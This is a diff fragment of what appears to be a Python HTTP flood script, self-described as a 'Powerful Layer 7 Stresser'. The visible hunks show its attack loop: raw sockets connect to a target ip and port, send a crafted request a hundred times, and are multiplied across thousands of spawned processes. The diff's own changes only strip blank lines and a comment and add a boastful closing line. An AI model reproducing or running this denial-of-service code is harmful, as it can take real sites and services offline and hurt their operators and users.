@@ -25,9 +25,7 @@ def randomip():
 
 print("[>>>] Starting the attack [<<<]")
 
-
 time.sleep(1)
-
 
 def attack():
   connection = "Connection: null\r\n"
@@ -39,7 +37,6 @@ def attack():
     try:
       atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       atk.connect((ip, port))
-      #Attack starts here
       for y in range(100):
           atk.send(str.encode(request))
     except socket.error:
@@ -47,7 +44,6 @@ def attack():
     except:
       pass
 
-    
 def sendattack():
   for i in range(5000):
     mp = multiprocessing.Process(target=attack)
@@ -61,3 +57,4 @@ def sendattack():
     mp3.start()
 
 sendattack()
+# 60 Line for Powerful Layer 7 Stresser Cool!
